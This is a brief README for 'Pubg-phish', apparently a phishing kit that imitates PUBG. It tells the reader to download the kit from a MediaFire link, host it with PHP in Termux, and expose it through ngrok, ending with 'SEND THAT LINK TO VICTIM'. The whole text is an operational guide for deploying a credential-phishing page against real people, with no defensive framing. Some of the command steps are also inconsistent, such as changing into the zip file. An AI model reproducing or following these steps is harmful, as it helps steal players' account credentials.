# Pubg-phish


## Download zip file
1. Open this link https://www.mediafire.com/file/g4eomdmk0hgrnpm/Pubg-phish.zip/file
2.In this link there is a zip file download it

## In termux
` termux-setup-storage` enable the storage permission
` cd /storage/emulated/0/Download `
`mv Pubg-phish $HOME `
`cd`
`unzip Pubg-phish.zip`
`cd Pubg-phish.zip`
`php -S localhost:3839` you can type any port I typed 3839

RIGHT NOW THE LINK IS ONLY WORKING IN LAN TO MAKE IT TO WORK IN WAN
(NOTE : NGROK MUST BE INSTALLED)

Open a new session
`cd`
` ./NGROK http 3839` if you have given different port type that port

LINK WILL BE GENERATED SEND THAT LINK TO VICTIM
